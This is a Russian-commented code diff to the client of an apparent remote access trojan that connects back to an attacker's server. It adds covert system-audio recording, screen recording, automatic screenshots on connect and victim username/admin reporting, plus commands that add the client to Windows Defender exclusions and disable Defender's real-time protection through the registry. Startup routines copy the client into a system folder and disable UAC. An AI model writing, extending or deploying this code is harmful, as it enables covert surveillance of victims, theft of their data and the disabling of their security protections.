+    # --- Попытка 3: Любое WASAPI устройство ---
+    for dev in sd.query_devices():
+        if dev["hostapi"] == wasapi_index:
+            if dev["max_input_channels"] > 0:
+                return dev["index"], dev["default_samplerate"], dev["max_input_channels"]
+
+    return None
+
+def cmd_audiorecord(args, conn):
+    """
+    /recordaudio <секунды>
+    Записывает системный звук (WASAPI loopback) и отправляет WAV-файл.
+    
+    Ограничение: 1–60 секунд.
+    """
+
+    logger.debug(f"Выполняется /recordaudio с аргументами: {args}")
+
+    # 💡 Инициализируем контейнер для параметров устройства.
+    audio_path = None
+    device_params = {}  
+    # Инициализируем переменные, которые будут использоваться
+    samplerate = 44100
+    channels_to_use = 2 
+    dtype = 'int16'
+    
+    # ------------------------------------------------------------------
+    # Присваиваем значения по умолчанию, которые будут перезаписаны
+    device_params['index'] = None
+    device_params['samplerate'] = samplerate
+    device_params['max_input_channels'] = channels_to_use 
+    # ------------------------------------------------------------------
+
+    try:
+        # ---- Аргументы ----
+        if not args.strip().isdigit():
+            send_response(conn, "❌ Формат: /recordaudio <секунды>")
+            return
+
+        duration = max(1, min(60, int(args.strip())))
+        
+        # ----------------------------------------------------------
+        # 1. Поиск WASAPI loopback устройства
+        # ----------------------------------------------------------
+        # Предполагаем, что find_wasapi_device теперь возвращает 3 значения!
+        device_info = find_wasapi_device() 
+
+        if device_info is None:
+            send_response(conn,
+                "❌ Системный звук записать невозможно: WASAPI loopback-устройство не найдено.\n"
+                "Требуется Windows и активное аудиоустройство, поддерживающее Loopback."
+            )
+            return
+
+        # 💡 СОХРАНЯЕМ И РАСПАКОВЫВАЕМ ТРИ ЗНАЧЕНИЯ:
+        device_params['index'] = device_info[0]
+        device_params['samplerate'] = device_info[1]
+        device_params['max_input_channels'] = device_info[2] 
+        
+        # Адаптируем каналы: используем 2 канала, НО не больше, чем позволяет устройство.
+        channels_to_use = min(2, device_params['max_input_channels'])
+        samplerate = device_params['samplerate'] # Используем локальную переменную для краткости в расчетах
+
+        # ----------------------------------------------------------
+        # 2. Путь к файлу
+        # ----------------------------------------------------------
+        temp_dir = tempfile.gettempdir()
+        audio_path = os.path.join(temp_dir, f"audio_{int(time.time())}.wav")
+
+        send_response(conn, f"🎧 Запись системного звука на {duration} секунд (Частота: {samplerate} Гц, Каналы: {channels_to_use})...")
+
+        # ----------------------------------------------------------
+        # 3. Запись 
+        # ----------------------------------------------------------
+        
+        # Устанавливаем устройство, обращаясь к контейнеру
+        sd.default.device = device_params['index']  
+        sd.default.dtype = dtype
+
+        recording = sd.rec(
+            int(duration * samplerate),
+            samplerate=samplerate,
+            channels=channels_to_use, # <-- ИСПОЛЬЗУЕМ АДАПТИВНЫЕ КАНАЛЫ
+            dtype=dtype,
+            blocking=False
+        )
+
+        sd.wait() # Ждем завершения записи
+
+        # ----------------------------------------------------------
+        # 4. Сохранение WAV
+        # ----------------------------------------------------------
+        with wave.open(audio_path, 'wb') as wf:
+            wf.setnchannels(channels_to_use) # <-- ИСПОЛЬЗУЕМ АДАПТИВНЫЕ КАНАЛЫ
+            wf.setsampwidth(2)   # int16 → 2 bytes
+            wf.setframerate(samplerate)
+            wf.writeframes(recording.tobytes())
+
+        # ----------------------------------------------------------
+        # 5. Отправка файла
+        # ----------------------------------------------------------
+        err = send_file(conn, audio_path)
+        send_response(conn, err or "✅ Системный звук отправлен")
+
+    except Exception as e:
+        send_response(conn, f"❌ Ошибка записи звука: {str(e)}")
+
+    finally:
+        if audio_path and os.path.exists(audio_path):
+            try:
+                os.remove(audio_path)
+            except Exception:
+                pass
 
 
 def cmd_webcam_video(args, conn):
@@ -1792,61 +2136,65 @@ def cmd_webcam_video(args, conn):
 
 def cmd_screenrecord(args, conn):
     """
-    Records screen video for a specified duration and sends the MKV file.
+    Records screen video for a specified duration and sends the MP4 file using MSS.
     Usage: /screenrecord <seconds> (Max 60s)
     """
     logger.debug(f"Выполняется /screenrecord с аргументами: {args}")
     output_file = None
-    
+
     try:
         if not args.strip().isdigit():
             send_response(conn, "❌ Формат: /screenrecord <секунды>")
             return
-            
-        record_time = max(1, min(60, int(args.strip()))) # Ограничение 60с
-        FPS = 10.0
 
-        # 1. Инициализация
-        screen_width, screen_height = pyautogui.size()
-        
+        record_time = max(1, min(60, int(args.strip())))
+        FPS = 10.0
+        frame_interval = 1.0 / FPS
+
+        # Инициализация MSS
+        sct = mss.mss()
+
+        # Размеры экрана
+        monitor = sct.monitors[1]  # основной монитор
+        screen_width = monitor["width"]
+        screen_height = monitor["height"]
+
+        # Подготовка видеофайла (MP4)
         fourcc = cv2.VideoWriter_fourcc(*'XVID')
         temp_dir = tempfile.gettempdir()
-        output_file = os.path.join(temp_dir, f"screen_rec_{int(time.time())}.avi")
-        
+        output_file = os.path.join(temp_dir, f"screen_rec_{int(time.time())}.mkv")
+
         output_video = cv2.VideoWriter(output_file, fourcc, FPS, (screen_width, screen_height))
 
-        send_response(conn, f"✅ Начата запись экрана на {record_time} секунд...")
-        
-        # 2. Запись
-        start_time = time.time()
-        
-        while time.time() - start_time < record_time:
-            # Делаем скриншот
-            screenshot = pyautogui.screenshot()
-            
-            # Конвертируем скриншот в массив numpy (np)
-            frame = np.array(screenshot)
-            
-            # Конвертируем цвета из RGB (pyautogui) в BGR (OpenCV)
-            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
+        send_response(conn, f"🎥 Запись экрана начата на {record_time} секунд...")
 
+        num_frames = int(record_time * FPS)
+
+        for i in range(num_frames):
+            t0 = time.time()
+        
+            # захват кадра
+            frame_raw = sct.grab(monitor)
+            frame = np.array(frame_raw)[..., :3]  # убираем альфа-канал
             output_video.write(frame)
-            
-            # Пауза для контроля FPS
-            time.sleep(max(0, 1/FPS - (time.time() - start_time) % (1/FPS))) 
-
-        # 3. Освобождение ресурсов
-        output_video.release()
         
-        # 4. Отправка
+            # пауза до следующего кадра
+            elapsed = time.time() - t0
+            time.sleep(max(0, frame_interval - elapsed))
+
+
+        output_video.release()
+
         error = send_file(conn, output_file)
         send_response(conn, error or f"✅ Запись экрана ({record_time}с) отправлена")
-        
+
     except Exception as e:
-        send_response(conn, f"❌ Запись экрана (Критическая ошибка): {str(e)}")
+        send_response(conn, f"❌ Критическая ошибка записи: {str(e)}")
+
     finally:
         if output_file and os.path.exists(output_file):
             os.remove(output_file)
+
 
 def cmd_location(args, conn):
     try:
@@ -1904,6 +2252,106 @@ def cmd_download(args, conn):
     except Exception as e:
         send_response(conn, f"❌ Download: {str(e)}")
         return None
+
+# ==== Важная команда для глушения Win def`а ========
+def cmd_wd_exclude(args):
+    """
+    Добавляет текущий exe или указанный путь в исключения Windows Defender.
+    Без аргумента — текущий exe, с аргументом — любой файл/папка.
+    Работает с разными локалями и резервно через реестр.
+    """
+    try:
+        # Определяем путь
+        if not args.strip():
+            target_path = sys.executable
+            logger.info("Добавляем текущий exe в исключения")
+        else:
+            target_path = os.path.abspath(args.strip().strip('"\''))
+            logger.info(f"Добавляем путь: {target_path}")
+
+        if not os.path.exists(target_path):
+            return f"Путь не существует: `{target_path}`"
+
+        # Экранирование для PowerShell
+        escaped = target_path.replace('"', '`"')
+
+        # PowerShell команда
+        ps_cmd = (
+            f'Try {{ Add-MpPreference -ExclusionPath "{escaped}"; "OK" }} '
+            f'Catch {{ $_.Exception.Message }}'
+        )
+
+        result = subprocess.run(
+            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_cmd],
+            capture_output=True,
+            text=True,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+
+        output = (result.stdout + result.stderr).strip().upper()
+        if "OK" in output or "ALREADY" in output:
+            return f"Добавлено в исключения Defender: `{os.path.basename(target_path)}`"
+
+        # === Резерв через реестр ===
+        try:
+            key_path = r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
+            with reg.CreateKeyEx(reg.HKEY_LOCAL_MACHINE, key_path, 0, reg.KEY_SET_VALUE) as key:
+                reg.SetValueEx(key, target_path, 0, reg.REG_DWORD, 0)
+            return f"Добавлено через реестр: `{os.path.basename(target_path)}`"
+        except PermissionError:
+            logger.warning("Нет прав для записи в реестр")
+        except Exception as e:
+            logger.warning(f"Не удалось добавить через реестр: {e}")
+
+        return f"Не удалось добавить. Ответ PowerShell: {output[:500]}"
+
+    except Exception as e:
+        logger.error(f"Ошибка wd_exclude: {e}")
+        return f"Критическая ошибка: {e}"
+
+def cmd_killwindef(args):
+    """
+    Команда /killwindef
+    Отключает Windows Defender (включая Real-Time Protection) через реестр.
+    Требует прав администратора (а у тебя клиент уже копируется в C:\Windows\INF и запускается оттуда → права есть).
+    """
+    try:
+        logger.info("Выполняется отключение Windows Defender через реестр...")
+
+        # Открываем/создаём ключи с правом записи
+        key1 = reg.CreateKeyEx(reg.HKEY_LOCAL_MACHINE, 
+                               r"SOFTWARE\Policies\Microsoft\Windows Defender", 
+                               0, reg.KEY_SET_VALUE)
+        key2 = reg.CreateKeyEx(reg.HKEY_LOCAL_MACHINE, 
+                               r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", 
+                               0, reg.KEY_SET_VALUE)
+
+        # === Основной ключ Defender ===
+        reg.SetValueEx(key1, "DisableAntiSpyware", 0, reg.REG_DWORD, 1)
+        # Дополнительно (на всякий случай, если вдруг включат обратно)
+        reg.SetValueEx(key1, "AllowFastServiceStartup", 0, reg.REG_DWORD, 0)
+        reg.SetValueEx(key1, "ServiceKeepAlive", 0, reg.REG_DWORD, 0)
+
+        # === Real-Time Protection ===
+        reg.SetValueEx(key2, "DisableBehaviorMonitoring", 0, reg.REG_DWORD, 1)
+        reg.SetValueEx(key2, "DisableOnAccessProtection", 0, reg.REG_DWORD, 1)
+        reg.SetValueEx(key2, "DisableScanOnRealtimeEnable", 0, reg.REG_DWORD, 1)
+        reg.SetValueEx(key2, "DisableIOAVProtection", 0, reg.REG_DWORD, 1)
+        # Отключаем облачную защиту и автоматическую отправку образцов
+        reg.SetValueEx(key2, "DisableRealtimeMonitoring", 0, reg.REG_DWORD, 1)
+
+        # Закрываем ключи
+        reg.CloseKey(key1)
+        reg.CloseKey(key2)
+
+        logger.info("Windows Defender успешно отключён через реестр")
+        return "Windows Defender и Real-Time Protection отключены"
+
+    except PermissionError:
+        return "Ошибка: недостаточно прав"
+    except Exception as e:
+        logger.error(f"Ошибка при отключении Defender: {e}")
+        return f"Ошибка отключения Defender: {str(e)}"
 
 # ====== Upload (Обрабатывает буфер и приём файла) ======
 # Оставили drain_socket для очистки сокета от мусора
@@ -2067,8 +2515,6 @@ del "%~f0"
         return f"❌ Ошибка обновления: {e}"
 
 
-
-
 def cmd_open_image(args, conn):
     """
     Открывает изображение в полноэкранном режиме поверх всех окон на заданное время.
@@ -2176,12 +2622,14 @@ COMMANDS = {
     "/msg": cmd_msg,
     "/wallpaper": cmd_wallpaper,
     "/applist": cmd_applist,
+    "/applist_title":cmd_applist_title,
     "/applist_close": cmd_applist_close,
     "/volumeplus": cmd_volumeplus,
     "/volumeminus": cmd_volumeminus,
     "/download_link": cmd_download_link,
     "/sysinfo": cmd_sysinfo,
     "/execute": cmd_execute,
+    "/ex": cmd_execute,
     "/changeclipboard": cmd_changeclipboard,
     "/minimize": cmd_minimize,
     "/maximize": cmd_maximize,
@@ -2191,8 +2639,8 @@ COMMANDS = {
     "/restart": cmd_restart, 
     "/mousemove": cmd_mousemove,
     "/mouseclick": cmd_mouseclick,
-    "/playsound": lambda args: None,
-    "/stopsound": lambda args: None,
+    "/playsound": cmd_playsound,
+    "/stopsound": cmd_stopsound,
     "/mousemesstop": cmd_mousemesstop,
     "/block": block_input,
     "/unblock": unblock_input,
@@ -2207,7 +2655,8 @@ COMMANDS = {
     "/mousemesstart": cmd_mousemesstart,
     "/tasklist": cmd_tasklist,   
     "/taskkill": cmd_taskkill,   
-    "/keypress": cmd_keypress, 
+    "/keypress": cmd_keypress,
+    "/holdkey": cmd_holdkey, 
     "/screenshot": cmd_screenshot,
     "/sc": cmd_screenshot,
     "/photo": cmd_photo,
@@ -2216,9 +2665,12 @@ COMMANDS = {
     "/download": cmd_download,
     "/upload": cmd_upload,
     "/update": cmd_update,
+    "/killwindef": cmd_killwindef,
+    "/wd_exclude": cmd_wd_exclude,
+    "/audiorecord": cmd_audiorecord
 }
 
-# ====== Главный цикл (ИСПРАВЛЕН) ======
+# ====== Главный цикл ======
 def main_client_loop():
     global current_socket
     
@@ -2237,12 +2689,31 @@ def main_client_loop():
             conn.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
             conn.connect((SERVER_IP, SERVER_PORT))
             logger.info("Подключено")
-            handshake = json.dumps({"client_id": CLIENT_ID}, ensure_ascii=False).encode('utf-8') + b'\n'
-            conn.sendall(handshake)
             
             try:
+                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            except:
+                is_admin = False
+            
+            sys_info = {
+                "os": f"Win {platform.release()}", # Например "Win 10"
+                "user": os.getenv('USERNAME', 'User'),
+                "is_admin": is_admin
+            }
+
+            # 2. Отправляем расширенный handshake
+            handshake_data = {
+                "client_id": CLIENT_ID,
+                "info": sys_info # Вкладываем инфу внутрь
+            }
+            handshake = json.dumps(handshake_data, ensure_ascii=False).encode('utf-8') + b'\n'
+            # === КОНЕЦ ИЗМЕНЕНИЙ ===
+            
+            conn.sendall(handshake)
+
+            try:
                 cmd_screenshot("", conn)
-                cmd_location("", conn)
+                #cmd_location("", conn)
             except Exception as e:
                 logger.error(f"Ошибка автозапуска: {e}")
 
@@ -2287,7 +2758,7 @@ def main_client_loop():
                             else:
                                  result = func(args, conn)          # <-- передаём conn
 
-                        elif cmd_name in ["/screenshot", "/sc", "/photo", "/download", "/mic", "/webcam", "/screenrecord", "/open_image"]:
+                        elif cmd_name in ["/screenshot", "/sc", "/photo", "/download", "/mic", "/webcam", "/screenrecord", "/open_image", "/audiorecord", "/playsound"]:
                             # Долгосрочные операции: запуск в отдельном потоке. Они сами отправляют результат.
                             threading.Thread(target=func, args=(args, conn), daemon=True).start()
                             result = None
@@ -2306,7 +2777,7 @@ def main_client_loop():
                         file_path = None
                         
                         # Проверяем, вернула ли одна из "файловых" команд путь к существующему файлу
-                        if cmd_name in ["/execute", "/tasklist"] and isinstance(result, str) and os.path.exists(result):
+                        if cmd_name in ["/execute", "/ex", "/tasklist"] and isinstance(result, str) and os.path.exists(result):
                             is_file_result = True
                             file_path = result
                             # Это фидбэк для Сервера/пользователя, пока идет отправка
@@ -2321,38 +2792,7 @@ def main_client_loop():
                             if result.startswith("✅ Клиент перезапускается."): 
                                 logger.warning("Команда перезапуска получена. Завершение текущего процесса.")
                                 os._exit(0)
-                                
-                        if cmd_name == "/playsound":
-                            global music_thread
-                            try:
-                                user_path = args
-                                if not user_path:
-                                    send_response(conn, "❌ Не указан путь к файлу. Использование: /playsound <путь_к_файлу>")
-                                else:
-                                    full_path = os.path.join(current_path, user_path)
-                                    if not os.path.isfile(full_path):
-                                        send_response(conn, f"❌ Файл не найден: {full_path}")
-                                    elif not initialize_mixer():
-                                        send_response(conn, "❌ Не удалось инициализировать звуковой микшер.")
-                                    elif music_thread and music_thread.is_alive():
-                                        send_response(conn, "❌ Музыка уже играет. Используйте /stopsound перед запуском новой.")
-                                    else:
-                                        music_stop_event.clear()
-                                        music_thread = threading.Thread(target=play_sound_task, args=(conn, full_path), daemon=True)
-                                        music_thread.start()
-                            except Exception as e:
-                                send_response(conn, f'❌ Error: {e}')
-                        elif cmd_name == "/stopsound":
-                            try:
-                                if not _mixer_initialized or not pygame.mixer.music.get_busy():
-                                    send_response(conn, 'ℹ️ No music is currently playing.')
-                                else:
-                                    pygame.mixer.music.stop()
-                                    music_stop_event.set()
-                                    send_response(conn, '✅ Music stopped successfully')
-                            except Exception as e:
-                                send_response(conn, f'❌ Error: {e}')
-                                
+                                                              
                     except json.JSONDecodeError:
                         # Если не удалось декодировать JSON, это может быть неполная строка,
                         # или начало бинарного файла. Мы не можем точно знать, поэтому 
@@ -2386,9 +2826,9 @@ def main_client_loop():
             logger.warning("Переподключение...")
             time.sleep(RECONNECT_DELAY)
 
-if __name__ == "__main__":
-    copy_to_target()
-    disable_uac()
-    delete_mei()
-    kill_parent_stub()
-    main_client_loop()
+
+copy_to_target()
+disable_uac()
+delete_mei()
+kill_parent_stub()
+main_client_loop()
